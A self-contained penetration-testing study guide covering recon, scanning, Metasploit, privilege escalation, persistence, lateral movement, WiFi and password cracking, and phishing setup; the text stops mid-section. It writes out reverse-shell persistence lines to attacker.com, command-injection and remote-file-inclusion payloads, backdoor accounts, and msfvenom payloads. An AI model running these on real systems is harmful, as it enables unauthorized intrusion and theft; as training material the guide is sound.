# Phase 4 — Ethical Hacking & Penetration Testing
> Complete self-contained notes. No external resources needed.
> Estimated time: 2–4 months

---

## Table of Contents
1. [1. Penetration Testing Fundamentals](#1-penetration-testing-fundamentals)
2. [2. Reconnaissance](#2-reconnaissance)
3. [3. Scanning & Enumeration](#3-scanning-enumeration)
4. [4. Vulnerability Assessment](#4-vulnerability-assessment)
5. [5. Exploitation](#5-exploitation)
6. [6. Post Exploitation](#6-post-exploitation)
7. [7. Wireless Security](#7-wireless-security)
8. [8. Password Attacks](#8-password-attacks)
9. [9. Social Engineering (Technical)](#9-social-engineering-technical)
10. [10. Report Writing](#10-report-writing)
11. [11. Tools Reference](#11-tools-reference)
12. [12. Quick Reference Cheatsheet](#12-quick-reference-cheatsheet)

---

## 1. Penetration Testing Fundamentals

### What is Penetration Testing?
A **legally authorized simulated attack** on a system to find vulnerabilities before real attackers do.

- You are paid to break in
- Everything is documented
- Scope is defined beforehand
- Goal: find and report vulnerabilities, not cause damage

---

### Pentest vs Vulnerability Assessment vs Red Team

| Type | What it does | Depth |
|------|-------------|-------|
| Vulnerability Scan | Automated tool finds known vulns | Surface level |
| Vulnerability Assessment | Scan + manual analysis + prioritization | Medium |
| Penetration Test | Actively exploit vulns, prove impact | Deep |
| Red Team | Full adversary simulation, stealth, long duration | Deepest |

---

### Types of Penetration Tests

**By Scope:**
- **Network Pentest** — external/internal network infrastructure
- **Web App Pentest** — web applications and APIs
- **Mobile Pentest** — Android/iOS apps
- **Social Engineering** — phishing, vishing, physical
- **Physical Pentest** — bypass physical security controls
- **Cloud Pentest** — AWS/Azure/GCP misconfigs

**By Knowledge Level:**

| Type | What attacker knows | Simulates |
|------|-------------------|-----------|
| Black Box | Nothing — just a target IP/URL | External attacker |
| Grey Box | Some info — credentials, architecture docs | Insider / partner |
| White Box | Everything — source code, network diagrams | Full audit |

---

### Penetration Testing Methodology

**Standard frameworks:**
- **PTES** (Penetration Testing Execution Standard)
- **OWASP Testing Guide**
- **NIST SP 800-115**
- **OSSTMM** (Open Source Security Testing Methodology Manual)

**Generic phases (used in most engagements):**

```
1. Pre-engagement    → Rules, scope, contracts
2. Reconnaissance    → Gather intel on target
3. Scanning          → Map attack surface
4. Exploitation      → Gain access
5. Post-Exploitation → Maintain access, pivot, collect data
6. Reporting         → Document everything
```

---

### Legal & Ethical Requirements

**Always get in writing before touching anything:**
- **Scope** — what systems are in/out of scope
- **Rules of Engagement (ROE)** — what methods are allowed
- **Emergency contacts** — who to call if something breaks
- **Authorization letter / Statement of Work (SOW)**

**Laws relevant to hacking (India):**
- IT Act 2000 — Section 43 (unauthorized access), Section 66 (hacking)
- Unauthorized access is a criminal offense even if "just testing"
- Written authorization is your legal protection

**Never:**
- Attack systems outside agreed scope
- Exfiltrate real sensitive data (document existence, don't steal)
- Cause denial of service unless explicitly allowed
- Continue after finding critical issue that could cause damage — stop and report

---

## 2. Reconnaissance

> Goal: Gather as much information about the target as possible **without touching their systems** (passive) or with minimal interaction (active).

### Passive Reconnaissance (OSINT)
No direct contact with target systems. Uses publicly available information.

---

#### WHOIS Lookup
Find domain registration information.

```bash
whois target.com
whois 192.168.1.1
```

Reveals:
- Registrant name/org
- Registration/expiry dates
- Name servers
- Registrar info

---

#### DNS Enumeration
Map out the DNS records of a target.

**DNS Record Types:**

| Record | Purpose |
|--------|---------|
| A | Domain → IPv4 address |
| AAAA | Domain → IPv6 address |
| MX | Mail servers |
| NS | Name servers |
| CNAME | Alias for another domain |
| TXT | SPF, DKIM, verification records |
| PTR | Reverse DNS (IP → domain) |
| SOA | Start of authority (zone info) |

```bash
# Basic DNS lookup
nslookup target.com
dig target.com
dig target.com MX
dig target.com NS
dig target.com TXT

# Zone transfer attempt (often fails but worth trying)
dig axfr @ns1.target.com target.com

# Reverse lookup
dig -x 192.168.1.1
```

**Zone Transfer:** If misconfigured, DNS server dumps ALL its records to anyone who asks.
```bash
dig axfr @nameserver target.com
```

---

#### Subdomain Enumeration
Find subdomains that might be forgotten, unpatched, or expose internal systems.

```bash
# Subfinder (passive — uses APIs)
subfinder -d target.com

# Amass (passive + active)
amass enum -passive -d target.com
amass enum -active -d target.com

# DNSx (resolve a list)
cat subdomains.txt | dnsx

# Brute force subdomains
ffuf -w /usr/share/wordlists/subdomains.txt -u https://FUZZ.target.com

# Certificate transparency logs
curl "https://crt.sh/?q=%.target.com&output=json"
```

**Certificate Transparency:** Every SSL cert issued is logged publicly at crt.sh — reveals subdomains.

---

#### Google Dorks
Use Google's search operators to find sensitive information indexed by Google.

| Dork | Finds |
|------|-------|
| `site:target.com` | All indexed pages on domain |
| `site:target.com filetype:pdf` | PDF files |
| `site:target.com inurl:admin` | Admin panels |
| `site:target.com intitle:"index of"` | Directory listings |
| `site:target.com ext:sql` | SQL files |
| `site:target.com ext:env` | Environment files (API keys!) |
| `site:target.com ext:log` | Log files |
| `inurl:target.com intext:password` | Passwords in content |
| `"target.com" filetype:xlsx` | Spreadsheets |

**GHDB (Google Hacking Database):** https://www.exploit-db.com/google-hacking-database
Collection of useful dorks for finding specific vulnerabilities.

---

#### Shodan
Search engine for internet-connected devices. Finds:
- Open ports and services
- Banner information (software versions)
- Default credentials
- Industrial control systems
- Cameras, printers, routers

```
# Shodan search examples
hostname:target.com
org:"Target Company"
ip:192.168.1.1
port:3389 country:IN           # RDP exposed in India
product:Apache version:2.4.49  # Specific vulnerable version
```

**Censys** — similar to Shodan, good for certificate and TLS research.

---

#### Email Harvesting
Collect email addresses for phishing or user enumeration.

```bash
# theHarvester
theHarvester -d target.com -b google,bing,linkedin

# hunter.io — web based
# https://hunter.io

# LinkedIn — manually search employees
# LinkedIn Sales Navigator (paid) for bulk
```

---

#### OSINT Framework
Website mapping OSINT tools by category: https://osintframework.com

**Key OSINT sources:**
- **LinkedIn** — employees, job roles, tech stack (job ads reveal tech used)
- **GitHub** — leaked credentials, internal code, API keys
- **Pastebin** — leaked data dumps
- **Wayback Machine** — archived old versions of sites (may have old vulns)
- **Social media** — employee names, office locations, events
- **Job listings** — "Experience with AWS, Jenkins, Kubernetes required" → reveals their stack

---

#### GitHub Recon
Developers often accidentally commit secrets.

```bash
# Search GitHub for target
site:github.com "target.com"
site:github.com "target.com" password
site:github.com "target.com" API_KEY

# Tools
trufflehog https://github.com/target/repo    # scan for secrets
gitleaks detect --source=.                   # scan local repo
```

**Common leaks in GitHub:**
- AWS keys (`AKIA...`)
- API keys and tokens
- Database passwords
- Private keys (`.pem` files)
- Internal IP addresses

---

### Active Reconnaissance
Direct interaction with target. Leaves traces in logs.

**Ping sweep — find live hosts:**
```bash
nmap -sn 192.168.1.0/24          # ping sweep
fping -a -g 192.168.1.0/24 2>/dev/null
```

**Traceroute — map network path:**
```bash
traceroute target.com
tracert target.com    # Windows
```

---

## 3. Scanning & Enumeration

> Goal: Map open ports, running services, versions, OS. Build a detailed picture of the attack surface.

### Nmap — The Essential Tool

**Basic Syntax:**
```bash
nmap [scan type] [options] [target]
```

**Scan Types:**

| Flag | Scan Type | Notes |
|------|-----------|-------|
| `-sS` | SYN scan (stealth) | Default for root, fast, less logged |
| `-sT` | TCP connect scan | Full 3-way handshake, more detectable |
| `-sU` | UDP scan | Slow, for DNS/SNMP/DHCP |
| `-sN` | NULL scan | No flags set |
| `-sF` | FIN scan | FIN flag only |
| `-sX` | Xmas scan | FIN+PSH+URG flags |
| `-sA` | ACK scan | Firewall mapping |
| `-sV` | Version detection | Detect service versions |
| `-sC` | Default scripts | Run default NSE scripts |
| `-O` | OS detection | Guess OS |
| `-A` | Aggressive | OS + version + scripts + traceroute |
| `-Pn` | Skip ping | Treat host as up (firewall blocking ping) |
| `-p-` | All ports | Scan all 65535 ports |
| `-p 80,443` | Specific ports | Scan only listed ports |
| `-F` | Fast scan | Top 100 ports |
| `--top-ports 1000` | Top N ports | Scan top N common ports |

**Common Nmap Commands:**
```bash
# Quick scan — top 1000 ports
nmap target.com

# Full scan — all ports, versions, scripts, OS
nmap -A -p- target.com

# Stealth SYN scan with version detection
nmap -sS -sV -O target.com

# Aggressive full scan with output
nmap -A -p- -oN output.txt target.com

# UDP scan (slow)
nmap -sU --top-ports 100 target.com

# Scan entire subnet
nmap -sn 192.168.1.0/24

# Fast recon
nmap -sV --open -p- --min-rate 5000 target.com

# NSE scripts
nmap --script=http-title target.com
nmap --script=smb-vuln-* target.com
nmap --script=vuln target.com

# Save all output formats
nmap -oA scan_results target.com    # .nmap, .xml, .gnmap
```

**Nmap Output:**
```
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 7.4
80/tcp   open     http      Apache httpd 2.4.6
443/tcp  open     ssl/https
3306/tcp filtered mysql
8080/tcp closed   http-alt
```

**Port States:**
- `open` — service is listening, can connect
- `closed` — port reachable but no service
- `filtered` — firewall blocking, can't determine state

---

### Service Enumeration

#### HTTP/HTTPS Enumeration
```bash
# Whatweb — identify technologies
whatweb http://target.com

# Nikto — web server scanner
nikto -h http://target.com

# Directory discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Check HTTP headers
curl -I http://target.com

# Check for interesting files
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml
curl http://target.com/.well-known/security.txt
```

---

#### SMB Enumeration (Windows File Sharing — Port 445)
```bash
# List shares
smbclient -L //target.com -N
smbclient -L //192.168.1.1 -U username

# Connect to share
smbclient //target.com/share -U username

# Enum4linux — comprehensive SMB enumeration
enum4linux -a target.com
enum4linux -u username -p password target.com

# Nmap SMB scripts
nmap --script=smb-enum-shares,smb-enum-users target.com
nmap --script=smb-vuln-* target.com

# CrackMapExec
crackmapexec smb target.com
crackmapexec smb target.com -u username -p password --shares
```

**What to look for in SMB:**
- Null sessions (no auth required)
- Readable/writable shares
- Usernames
- OS version (old = vulnerable)
- EternalBlue (MS17-010) vulnerability

---

#### FTP Enumeration (Port 21)
```bash
# Check for anonymous login
ftp target.com
# Username: anonymous
# Password: (blank or email)

# Nmap script
nmap --script=ftp-anon,ftp-bounce target.com

# List files after login
ftp> ls -la
ftp> get filename
```

---

#### SSH Enumeration (Port 22)
```bash
# Get SSH version
ssh -V
nmap -sV -p 22 target.com

# Check supported auth methods
ssh -v target.com

# Username enumeration (older OpenSSH versions)
nmap --script=ssh-auth-methods target.com
```

---

#### SMTP Enumeration (Port 25)
```bash
# Connect manually
telnet target.com 25

# VRFY — verify if user exists
VRFY admin@target.com

# EXPN — expand mailing list
EXPN admins@target.com

# Nmap
nmap --script=smtp-enum-users target.com
```

---

#### SNMP Enumeration (Port 161 UDP)
```bash
# SNMP walk — dump all info (if community string known)
snmpwalk -c public -v1 target.com

# Common community strings
# public (read), private (write)

# onesixtyone — brute force community strings
onesixtyone -c community.txt target.com
```

---

#### LDAP Enumeration (Port 389)
```bash
# Ldapsearch
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"

# With credentials
ldapsearch -x -H ldap://target.com -D "cn=admin,dc=target,dc=com" -w password -b "dc=target,dc=com"

# Nmap
nmap --script=ldap-search target.com
```

---

#### RDP Enumeration (Port 3389)
```bash
# Check if RDP is open
nmap -sV -p 3389 target.com

# Nmap scripts
nmap --script=rdp-enum-encryption target.com
nmap --script=rdp-vuln-ms12-020 target.com
```

---

### Web Technology Fingerprinting
Identify what the target is running.

```bash
# Wappalyzer (browser extension)
# BuiltWith (website)

# whatweb
whatweb target.com -v

# Response headers reveal tech
Server: Apache/2.4.6 (CentOS)
X-Powered-By: PHP/7.2.0
```

---

## 4. Vulnerability Assessment

> Goal: Identify known vulnerabilities in discovered services and versions.

### Manual Research
Once you have service versions from Nmap:

```bash
# Search for exploits
searchsploit apache 2.4.49
searchsploit openssh 7.4

# CVE databases
# https://nvd.nist.gov
# https://cve.mitre.org
# https://www.exploit-db.com

# Copy exploit to current dir
searchsploit -m 12345
```

---

### Automated Scanners

**Nessus** (industry standard, paid):
- Most comprehensive
- Authenticated and unauthenticated scans
- Compliance checks

**OpenVAS** (free alternative):
```bash
# Start OpenVAS
gvm-start

# Access web UI at https://localhost:9392
```

**Nuclei** (fast, template-based):
```bash
# Scan with all templates
nuclei -u https://target.com

# Specific categories
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t vulnerabilities/
nuclei -u https://target.com -t exposures/

# Scan a list of targets
nuclei -l targets.txt -t cves/

# Severity filter
nuclei -u https://target.com -severity critical,high
```

---

### CVE — Common Vulnerabilities and Exposures

**CVE ID format:** CVE-YEAR-NUMBER (e.g., CVE-2021-44228)

**CVSS Score (Common Vulnerability Scoring System):**

| Score | Severity |
|-------|---------|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

**Famous CVEs to know:**
| CVE | Name | What it does |
|-----|------|-------------|
| CVE-2017-0144 | EternalBlue | SMB RCE (WannaCry used this) |
| CVE-2021-44228 | Log4Shell | RCE via Log4j logging library |
| CVE-2021-34527 | PrintNightmare | Windows Print Spooler RCE |
| CVE-2014-0160 | Heartbleed | OpenSSL memory leak |
| CVE-2014-6271 | Shellshock | Bash RCE via env variables |
| CVE-2019-0708 | BlueKeep | RDP RCE (pre-auth) |

---

## 5. Exploitation

> Goal: Prove vulnerabilities are exploitable. Gain access to target system.

### Metasploit Framework

The most widely used exploitation framework.

**Architecture:**
```
Modules:
├── Exploits    → Attack vulnerabilities
├── Payloads    → Code that runs after exploit (shell, meterpreter)
├── Auxiliaries → Scanners, fuzzers, no payload needed
├── Post        → Post-exploitation modules
├── Encoders    → Obfuscate payloads
└── NOPs        → No-operation sleds
```

**Basic Workflow:**
```bash
# Start Metasploit
msfconsole

# Search for module
msf> search eternalblue
msf> search type:exploit name:ms17

# Use a module
msf> use exploit/windows/smb/ms17_010_eternalblue

# See options
msf> show options
msf> show payloads

# Set required options
msf> set RHOSTS 192.168.1.100
msf> set LHOST 192.168.1.50
msf> set LPORT 4444
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
msf> run
msf> exploit
```

---

### Payload Types

**Singles** — Self-contained, no stager needed (larger)
```
windows/shell_reverse_tcp
```

**Stagers + Stages** — Small stager connects back, downloads larger stage
```
windows/meterpreter/reverse_tcp   (staged — "/" separator)
windows/meterpreter_reverse_tcp   (stageless — "_" separator)
```

**Connection Types:**

| Type | Direction | Use when |
|------|-----------|---------|
| Reverse TCP | Target → Attacker | Target is behind firewall/NAT |
| Bind TCP | Attacker → Target | Attacker is behind NAT |
| Reverse HTTPS | Target → Attacker | Blends with normal traffic |

---

### Meterpreter — Post-Exploitation Shell

Meterpreter is an advanced payload that runs in memory (no file on disk).

```bash
# System info
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getpid

# File system
meterpreter> ls
meterpreter> pwd
meterpreter> cd C:\\Users
meterpreter> upload /local/file.exe C:\\temp\\file.exe
meterpreter> download C:\\file.txt /local/

# Networking
meterpreter> ipconfig
meterpreter> netstat

# Process
meterpreter> ps                    # list processes
meterpreter> migrate 1234          # migrate to another process

# Privilege escalation
meterpreter> getsystem             # attempt auto privesc

# Dump credentials
meterpreter> hashdump              # dump SAM hashes (needs SYSTEM)

# Pivot
meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.2.1

# Screenshot / keylogger
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> keyscan_dump

# Shell
meterpreter> shell                 # drop to system shell
```

---

### Manual Exploitation (Without Metasploit)

**SearchSploit + Manual Exploit:**
```bash
# Find exploit
searchsploit apache 2.4.49
searchsploit -m 50383    # copy to current dir

# Read exploit
cat 50383.py

# Run exploit
python3 50383.py http://target.com /etc/passwd
```

**Compile C exploits:**
```bash
gcc exploit.c -o exploit
./exploit target.com 80
```

---

### Common Exploitation Techniques

#### Buffer Overflow (Basic Concept)
Program allocates fixed-size buffer. If input exceeds buffer size, it overwrites adjacent memory — including the return address.

```
Memory layout:
[Buffer (100 bytes)] [EBP] [EIP (return address)]

Attack:
[AAAAAAAAAA... (overflow)] [new EIP → shellcode]
```

**Steps for basic stack BOF:**
1. Fuzz — crash the application
2. Find offset — where does EIP get overwritten?
3. Control EIP — confirm you control return address
4. Find bad characters — bytes the program won't accept
5. Find jump point — `JMP ESP` or similar gadget
6. Write shellcode — payload to execute

**Tools:**
```bash
# Pattern generation (find offset)
msf-pattern_create -l 200
msf-pattern_offset -l 200 -q 41306341

# Immunity Debugger + mona.py (Windows)
# GDB + pwndbg (Linux)
# pwntools (Python exploit framework)
```

---

#### Command Injection
When user input is passed to system commands without sanitization.

```bash
# Vulnerable code (PHP)
system("ping " . $_GET['host']);

# Attack
http://target.com/ping.php?host=8.8.8.8; cat /etc/passwd
http://target.com/ping.php?host=8.8.8.8 && whoami
http://target.com/ping.php?host=8.8.8.8 | id

# Blind command injection (no output)
http://target.com/ping.php?host=8.8.8.8; sleep 5
http://target.com/ping.php?host=8.8.8.8; curl attacker.com/$(whoami)
```

---

#### File Inclusion
**LFI (Local File Inclusion):** Read local files on server.
```
http://target.com/page.php?file=../../../etc/passwd
http://target.com/page.php?file=....//....//etc/passwd
http://target.com/page.php?file=/etc/passwd%00  (null byte — older PHP)
```

**RFI (Remote File Inclusion):** Include remote file (executes PHP).
```
http://target.com/page.php?file=http://attacker.com/shell.php
```

---

## 6. Post Exploitation

> Goal: After getting access, expand that access, gather data, maintain persistence, move through network.

### Privilege Escalation

**Goal:** Go from low-privilege user to root (Linux) or SYSTEM/Administrator (Windows).

---

#### Linux Privilege Escalation

**Basic enumeration after getting shell:**
```bash
# Who am I?
id
whoami
groups

# OS and kernel version
uname -a
cat /etc/os-release
cat /proc/version

# Network
ifconfig / ip a
netstat -antup
cat /etc/hosts

# Users
cat /etc/passwd
cat /etc/shadow    # need root to read
who
last

# Running processes
ps aux
ps aux | grep root

# Installed software
dpkg -l
rpm -qa

# Environment variables
env
echo $PATH

# Interesting files
find / -name "*.txt" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null    # SSH private keys
find / -writable -type f 2>/dev/null
```

**SUID/SGID Binaries:**
Files with SUID bit run as the file owner (often root).
```bash
# Find SUID files
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -g=s -type f 2>/dev/null

# Check GTFOBins for exploitation
# https://gtfobins.github.io
```

**GTFOBins:** List of Unix binaries that can bypass security restrictions.
```bash
# Example: nmap SUID
nmap --interactive
nmap> !sh    # drops to shell as root

# Example: find SUID
find . -exec /bin/sh -p \; -quit
```

**Sudo Misconfigurations:**
```bash
# What can this user run as sudo?
sudo -l

# Common misconfigs
# (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/sh")'

# Check sudo version for CVE-2021-3156 (Baron Samedit)
sudo --version
```

**Cron Jobs:**
```bash
# View cron jobs
cat /etc/crontab
ls /etc/cron.*
crontab -l

# Look for:
# - Scripts running as root that you can write to
# - Wildcard injection in tar, chown, chmod
```

**Writable Files:**
```bash
# Find world-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# If /etc/passwd is writable — add root user
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # password: hacker
```

**Weak File Permissions:**
```bash
# Readable /etc/shadow
cat /etc/shadow
# Crack hashes with hashcat

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

**Kernel Exploits:**
```bash
# Get kernel version
uname -a

# Search for kernel exploits
searchsploit linux kernel 4.4
searchsploit linux local privilege

# Famous kernel exploits
# DirtyCow (CVE-2016-5195) — Linux kernel < 4.8.3
# DirtyPipe (CVE-2022-0847) — Linux kernel 5.8–5.16.11
```

**Automated Linux PrivEsc Enumeration:**
```bash
# LinPEAS (most comprehensive)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh
```

---

#### Windows Privilege Escalation

**Basic enumeration:**
```cmd
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
ipconfig /all
netstat -ano
tasklist /SVC
```

**Powershell enumeration:**
```powershell
Get-LocalUser
Get-LocalGroup
Get-Process
Get-Service
Get-ScheduledTask
Get-WmiObject Win32_Product    # installed software
```

**Unquoted Service Paths:**
```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# If path is: C:\Program Files\Vulnerable App\service.exe
# Windows tries: C:\Program.exe → C:\Program Files\Vulnerable.exe
# If you can write C:\Program.exe → privesc!
```

**Weak Service Permissions:**
```cmd
# Check service permissions
accesschk.exe -uwcv Everyone *
accesschk.exe -uwcv "Authenticated Users" *

# If you can modify service binary → replace with malicious executable
```

**Always Install Elevated:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1 → can install MSI as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f msi -o exploit.msi
msiexec /quiet /qn /i exploit.msi
```

**Token Impersonation:**
```
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
```

**Automated Windows PrivEsc:**
```cmd
# WinPEAS
winpeas.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Sherlock (old but fast)
Find-AllVulns
```

---

### Persistence Mechanisms

**Goal:** Maintain access even if system reboots or connection drops.

**Linux Persistence:**
```bash
# Cron job (runs every minute)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -

# Add SSH key
echo "ssh-rsa AAAA... attacker" >> /root/.ssh/authorized_keys

# Modify .bashrc (triggers on login)
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /home/user/.bashrc

# Systemd service
# Create /etc/systemd/system/backdoor.service
```

**Windows Persistence:**
```cmd
# Registry run key
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"

# Scheduled task
schtasks /create /tn "Updater" /tr "C:\temp\shell.exe" /sc minute /mo 1

# Startup folder
copy shell.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### Lateral Movement

**Goal:** Move from one compromised machine to others in the network.

```bash
# Pass-the-Hash (Windows — NTLM)
# Use NTLM hash without cracking it
crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# PSExec with hash
impacket-psexec Administrator@192.168.1.100 -hashes aad3:31d6cfe0d16ae931b73c59d7e0c089c0

# WMI execution
impacket-wmiexec Administrator:password@192.168.1.100

# SMB with credentials
crackmapexec smb 192.168.1.0/24 -u admin -p password --exec-method smbexec -x "whoami"

# RDP
xfreerdp /u:Administrator /p:password /v:192.168.1.100
```

---

### Pivoting

**Goal:** Route traffic through compromised host to reach otherwise unreachable networks.

```
Attacker (10.10.10.50)
    ↓
Compromised Host (10.10.10.100 / 192.168.1.100)
    ↓
Internal Network (192.168.1.0/24) ← previously unreachable
```

```bash
# SSH tunneling
# Local port forward (access remote service through SSH)
ssh -L 8080:192.168.1.10:80 user@jumphost

# Dynamic SOCKS proxy
ssh -D 9050 user@jumphost
proxychains nmap 192.168.1.0/24

# Metasploit route
meterpreter> run post/multi/manage/autoroute
msf> route add 192.168.1.0/24 [session_id]

# Chisel (fast TCP tunnel)
# Attacker
./chisel server --port 8000 --reverse
# Target
./chisel client attacker.com:8000 R:socks
# Use with proxychains
```

---

### Data Collection & Exfiltration

```bash
# Linux — interesting locations
/etc/passwd
/etc/shadow
/home/*/.*history
/home/*/.ssh/id_rsa
/var/www/html/config.php    # web app credentials
/root/.bash_history

# Windows — interesting locations
C:\Windows\System32\config\SAM        # password hashes (needs SYSTEM)
C:\Windows\System32\config\SYSTEM
C:\Users\*\Desktop\
C:\Users\*\Documents\
C:\Users\*\AppData\Roaming\  # browser passwords

# Dump Windows hashes
meterpreter> hashdump
# or
impacket-secretsdump Administrator:password@192.168.1.100
```

---

## 7. Wireless Security

### WiFi Basics
- **SSID** — network name
- **BSSID** — MAC address of access point
- **Channel** — frequency channel (1–14 for 2.4GHz)
- **Beacon frames** — AP broadcasts existence periodically

---

### Monitor Mode
```bash
# Check interface
iwconfig

# Enable monitor mode
airmon-ng start wlan0
# or
ip link set wlan0 down
iwconfig wlan0 mode monitor
ip link set wlan0 up

# Kill processes that interfere
airmon-ng check kill
```

---

### WPA2 Handshake Capture
```bash
# Step 1: Discover networks
airodump-ng wlan0mon

# Step 2: Target specific network
airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon

# Step 3: Force client to reconnect (deauth attack)
aireplay-ng --deauth 10 -a [AP MAC] -c [Client MAC] wlan0mon

# Step 4: Crack the handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# With Hashcat (faster - GPU)
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

### PMKID Attack (No client needed)
```bash
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

---

### Evil Twin Attack
```bash
# Create rogue AP with same SSID
# Clients connect thinking it's legitimate
# Tools: hostapd-wpe, airbase-ng, WiFi-Pumpkin

# Basic rogue AP
airbase-ng -a [BSSID] --essid "TargetSSID" -c [channel] wlan0mon
```

---

## 8. Password Attacks

### Types of Password Attacks

| Attack | Method |
|--------|--------|
| Dictionary | Try words from wordlist |
| Brute Force | Try all combinations |
| Rule-based | Apply mutations to wordlist |
| Rainbow Table | Precomputed hash lookup |
| Credential Stuffing | Use leaked username:password combos |
| Password Spraying | One password tried across many accounts |

---

### Wordlists
```bash
# Best wordlists
/usr/share/wordlists/rockyou.txt          # 14 million passwords
/usr/share/wordlists/fasttrack.txt        # common passwords
/usr/share/seclists/Passwords/            # SecLists collection

# CeWL — generate wordlist from target website
cewl http://target.com -d 3 -m 6 -w wordlist.txt
# -d depth, -m minimum word length
```

---

### Hashcat — GPU Password Cracking

```bash
# Identify hash type
hashcat --example-hashes | grep -i ntlm
# or use hash-identifier / haiti

# Basic crack
hashcat -m [hash_type] hash.txt wordlist.txt

# Common hash types
# -m 0     = MD5
# -m 100   = SHA1
# -m 1400  = SHA256
# -m 1800  = sha512crypt (Linux shadow)
# -m 1000  = NTLM (Windows)
# -m 3200  = bcrypt
# -m 22000 = WPA2

# Attack modes
# -a 0 = Dictionary attack
# -a 1 = Combination attack
# -a 3 = Brute force (mask attack)
# -a 6 = Hybrid wordlist + mask

# Dictionary attack
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# Dictionary + rules (more mutations)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (mask)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?d?d?d?d
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = symbol, ?a = all

# Show cracked passwords
hashcat -m 1000 hashes.txt --show
```

---

### John the Ripper

```bash
# Auto-detect hash and crack
john hash.txt

# With wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With rules
john hash.txt --wordlist=rockyou.txt --rules

# Crack /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# Show cracked
john hash.txt --show

# Crack zip password
zip2john file.zip > zip.hash
john zip.hash
```

---

### Hydra — Online Brute Force

```bash
# SSH brute force
hydra -l root -P rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic auth
hydra -l admin -P rockyou.txt target.com http-get /admin

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.100

# RDP
hydra -l Administrator -P rockyou.txt rdp://192.168.1.100

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.100

# Options
# -l = single login  -L = login list
# -p = single pass   -P = password list
# -t = threads       -V = verbose
```

---

### Default Credentials
Always try default credentials before brute forcing.

Common defaults:
- `admin:admin`
- `admin:password`
- `admin:` (blank)
- `root:root`
- `administrator:administrator`

Resources:
- https://cirt.net/passwords
- https://default-password.info

---

## 9. Social Engineering (Technical)

### Phishing Infrastructure Setup

**Components:**
1. Domain (typosquat target — paypa1.com, g00gle.com)
2. SSL certificate (Let's Encrypt — free)
3. Email server or SMTP relay
4. Phishing page (clone of login page)
5. Credential capture backend

**Tools:**
```bash
# GoPhish — phishing campaign manager
# https://getgophish.com
./gophish

# Evilginx2 — advanced MFA bypass phishing (man-in-the-middle)
# Captures session cookies, not just credentials

# SET (Social Engineering Toolkit)
setoolkit
```

---

### Payload Delivery Methods

**Malicious Documents:**
```bash
# Create malicious macro in Office doc
# msfvenom macro payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f vba

# HTA files (HTML Application — executes VBScript/JScript)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f hta-psh -o evil.hta
```

**USB Attacks:**
